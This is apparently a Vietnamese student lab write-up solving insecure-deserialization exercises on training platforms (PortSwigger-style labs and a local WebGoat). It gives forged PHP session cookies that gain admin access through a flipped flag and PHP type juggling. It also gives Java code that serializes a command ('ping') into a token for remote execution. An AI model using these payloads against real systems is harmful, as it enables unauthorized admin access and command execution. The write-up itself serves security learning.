# ltat_lab2
## Bài 7:

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/8ec78c64-6948-45e6-858b-bee4f018de1e)


- Mục tiêu của bài này là xóa được user ```carlos``` .
- Trước hết mình phải login bằng user và pass được cho trước.
- Sau một hồi scan thì mình tìm được đường dẫn ```/admin``` .

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/c657e443-280e-40c4-8361-f27aafb68927)


- Có vẻ mình không thể vào được với người dùng bình thường.
- Check sơ qua cookie thì mình thấy một cookie có giá trị là ```session``` .
- Mình sẽ thử bật burpsuite lên để test thử.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/c00d99fd-d043-411b-a24d-d44b345fa787)


- Khi gửi req đến ```/admin``` server sẽ kiểm tra biến session của chúng ta, khi mình decode thử thì ra được một đối tượng là user.
- Điểm đáng chú ý ở đây là giá trị admin của session này đang là 0 ( do biến bool quyết định )
- Giờ mình chỉ cần chuyển nó về thành 1 và gửi req thì có thể bypass phần này.

  ![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/40464057-71cf-40b6-8ed0-984193eaf6f7)


- Giờ thì khi xóa user ```carlos``` chúng ta cũng sẽ làm tương tự.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/07f9b6f5-9609-46b2-aab2-94998f341e08)


```session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d```

## Bài 8:

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/40278edf-59b9-4757-b827-5918f469a98b)


- Bài này lúc đầu vào cũng giống bài trước nên mình sẽ vào thẳng phần session.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/78681bee-3415-44f3-bf0f-18b6d2670de1)



```O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"f4fb8seskjly3qw37onpt6ujkprn1co7";}```

- Ở đây chúng ta có vài trường mới trong class User này đó là ```username``` và ```access_token```.
- Theo mình hiểu thì ```access_token``` là một trường dùng để kiểm tra xem class có bị sửa đổi gì hay không và nếu nó sai thì sẽ không cho ta truy cập.
- Còn về phần username thì ở đây bắt buộc phải là ```administrator``` .
- Mình đọc hint thì có vẻ bài này được viết trên PHP, và mình nghỉ ngay đến một lỗi trong quá trình so sánh kiểu dữ liệu của PHP đó là php type juggling.
- Từ những dữ kiện trên, mình đã đã tạo được một class mới với giá trị như sau.

```O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}```
- Với Class này, mình đã đổi tên của user và đồng thời ép kiểu dữ liệu của access_token là int với giá trị là 0. Điều này làm cho biến access_token sẽ bị lỗi và trả về giá trị đúng.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/77148656-91ab-4190-a383-3062ad41e0df)


- Vậy là mình đã bypass qua phần admin, bây giờ chỉ cần xóa User là solve được bài này.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/036cf3aa-e73e-4fa5-9418-85bcf3159af4)


```session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9```

## Bài 9:

- Để có WebGoat trên loacal thì trong bài này mình sẽ dùng Docker để hosting.

```docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat```
- Sau khi chạy lệnh trên thì trên docker của bạn đã có container của WebGoat.

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/397fb3fc-d1e2-4d27-964d-2a378e6baa1f)

- Để truy cập chúng ta chỉ cần vào đường dẫn ```localhost:8080/WebGoat```
  
![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/15f8338f-240b-46a7-9ad8-512cd9ac77c1)


- Đây là một chall về JAVA, đề cho chúng ta một đoạn code có sẵn:

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/9c63ccc9-23a1-4d64-9a7f-76473226e4b2)


- Ở đây chúng ta có một đoạn code đáng chú ý.
 
![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/0f68e543-f98e-4824-a01a-3e11b7035693)


- Class VulnerableTaskHolder sẽ truyền mọi taskAction mà ta truyền vào nó, điều này có nghĩa là chúng ta có thể tận dụng điểm này để truyền một câu lệnh nào đó vào đây.
- Mình sẽ viết một đoạn code để có thể tạo một token thực hiện lệnh ```ping``` .

```java

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import org.dummy.insecure.framework.VulnerableTaskHolder;


public class Program {
    public static void main(String args[]) throws Exception{
        VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("ping","ping -n 4 127.0.0.1");
		
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(vulnObj);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
```

![image](https://github.com/TooBunReal/ltat_lab2/assets/89735990/60b9c880-cbe8-4250-adb7-3744f28119d4)


-Đây là Token:
```rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnChQWOB41NIOieHQAE3BpbmcgLW4gNCAxMjcuMC4wLjF0AARwaW5n```

![393904979_776481387524809_6695519617529434868_n](https://github.com/TooBunReal/ltat_lab2/assets/89735990/e46f6d5b-4765-42d1-b78f-2b6d324799b1)


